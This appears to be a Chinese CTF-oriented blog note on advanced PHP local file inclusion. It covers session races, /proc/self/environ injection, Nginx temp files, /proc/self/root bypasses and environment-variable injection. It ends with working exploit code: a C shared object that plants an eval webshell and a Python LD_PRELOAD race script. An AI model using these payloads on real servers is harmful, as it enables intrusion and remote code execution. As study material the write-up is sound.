## 前言

以前的LFI，就是利用一些基本的php伪协议或者日志文件包含来getshell，这儿总结一下一些进阶的一些LFI

##  PHPSESSION文件包含

### 原理：

>配置session.upload_progress.enabled = on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 
>
>我们通过`PHP_SESSION_UPLOAD_PROGRESS`将恶意语句写入session的文件，得知session的文件名，就可以再次包含实现getshell
>
>因为`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空
>
>所以进行条件竞争来RCE



详见：https://blog.csdn.net/unexpectedthing/article/details/122888905

##  通过/proc/self/environ

关于`/proc`的知识，[看看这篇](https://blog.csdn.net/unexpectedthing/article/details/121338877)

当然`/proc/self/environ`就可以得到当前进程的环境变量

具体的操作流程：

如果`/proc/self/environ`文件可以通过LFI访问，那么在这种情况下`RCE`可以通过请求文件结合写入HTTP User-Agent字段的payload来实现。

```
GET lfi.php?file=../../../proc/self/environ HTTP/1.1
User-Agent: <?php phpinfo();?>
```

现在，如果攻击者将上述 http 请求发送到 Web 服务器，那么：

- 首先将 User-Agent 字段上的数据写入`/proc/self/environ`文件。
- 然后页面请求`lfi.php?file=../../../proc/self/environ`会将`/proc/self/environ`文件的内容包含到输出页面中，并且我们的有效负载被执行。

[可以看看这篇](https://sec-art.net/2021/10/27/exploiting-local-file-inclusion-lfi-vulnerability-with-proc-self-environ-method-lfi-attacks/)

## 利用临时文件来getshell

###   通过PHPINFO特性包含临时文件

### 利用php7 Segment Fault包含临时文件

懒得自己写了，下面这个写得比较清楚了

[直接上链接](https://www.anquanke.com/post/id/201136)

## compress.zip://产生临时文件

主要作用是:`compress.zip://`上传文件的话，可以保持http长链接竞争保存临时文件。当然	我们也可以上传大文件来增长产生临时文件的时间。

看看这个题(includer)：https://blog.zeddyu.info/2020/01/08/36c3-web/#get-flag

思路很好，利用点就是

>1. 利用 `compress.zlib://http://`or`compress.zlib://ftp://` 来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件
>2. 利用超长的 name 溢出 output buffer 得到 sandbox 路径
>3. 利用 Nginx 配置错误，通过 `.well-known../files/sandbox/`来获取我们 tmp 文件的文件名
>4. 发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码
>5. 绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag

## Nginx中的技巧生成临时文件

原理：

>- Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件
>- 通过多重链接绕过 PHP LFI stat 限制完成 LFI

从中还介绍了利用`/proc/self/fd`来找到进程下删除的文件



[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235#h3-7)

利用`多次重复 / proc/self/root 绕过`

```php
<?php
error_reporting(E_ALL);
require_once('flag.php');
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    require_once($content);
} //题目的代码来自WMCTF2020 make php great again 2.0 绕过require_once是预期解
```

payload

```
php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

//result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo=
```

也可以绕过`is_file`

```php
function filter($file){
    if(preg_match('/\.\.\/|http|filter|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

```txt
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

##  利用编码来构造php代码实现rce

原理：

>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需**临时文件**的 RCE

https://tttang.com/archive/1395/

这儿还有一篇是关于php://filter利用编码形式处理垃圾数据，从而达到构造正确的php代码

与上面有异曲同工之妙。

##  再看2022HFCTF中这个LFI

```php
<?php (empty($_GET["env"])) ? highlight_file(__FILE__) : putenv($_GET["env"]) && system('echo hfctf2022');?>
```

考点：

1. Nginx 接收Fastcgi的过大响应 或 request body过大时会缓存到临时文件

2. 当然也利用到了利用环境变量注入来RCE

参考：https://tttang.com/archive/1450/#toc_0x0b

总结下：

php中调用system本质上是调用了sh -c，在不同操作系统中：

- debian：sh→dash
- centos：sh→bash

总结：

- `BASH_ENV`：可以在`bash -c`的时候注入任意命令
- `ENV`：可以在`sh -i -c`的时候注入任意命令
- `PS1`：可以在`sh`或`bash`交互式环境下执行任意命令
- `PROMPT_COMMAND`：可以在`bash`交互式环境下执行任意命令
- `BASH_FUNC_xxx%%`：可以在`bash -c`或`sh -c`的时候执行任意命令

但是题目就是P师傅没解决的debian系统

上面写的就解决了这个问题

Nginx对于请求的body内容会以临时文件的形式存储起来

大概思路是：

- nginx请求一个过大的body，当大于buffer时，会在/proc/self/fd目录下生成临时文件
- 在临时文件彻底删除前，竞争LD_PRELOAD包含 proc 目录下的临时文件

所以这个题：我们先传一个so文件进去，然后包含这个临时文件，就可以实现RCE

生成so文件

```c
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
__attribute__ ((__constructor__)) void angel (void){
unsetenv("LD_PRELOAD");
system("echo \"<?php eval(\\$_POST[cmd]);?>\" > /var/www/html/flag");
} 


```

编译一下

```
gcc -shared -fPIC exp.c -o exp.so
```

这个c代码后，可以定义一个函数加入很多无用代码，增加请求body的长度，更容易产生临时文件

```
a=0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0;
```

然后就是竞争的脚本了

```python
import requests
import _thread

f=open("exp.so",'rb')
data=f.read()
url=""

def upload():
    print("start upload")
    while True:
        requests.get(url+"index.php",data=data)

def preload(fd):
    while True:
        print("start ld_preload")
        for pid in range(10,20):
            file = f'/proc/{pid}/fd/{fd}'
            # print(url+f"index.php?env=LD_PRELOAD={file}")
            resp = requests.get(url+f"index.php?env=LD_PRELOAD={file}")
            # print(resp.text)
            if 'uid' in resp.text:
                print("finished")
                exit()

try:
    _thread.start_new_thread(upload, ())
    for fd in range(1, 20):
        _thread.start_new_thread(preload,(fd,))
except:
    print("error")

while True:
    pass
```

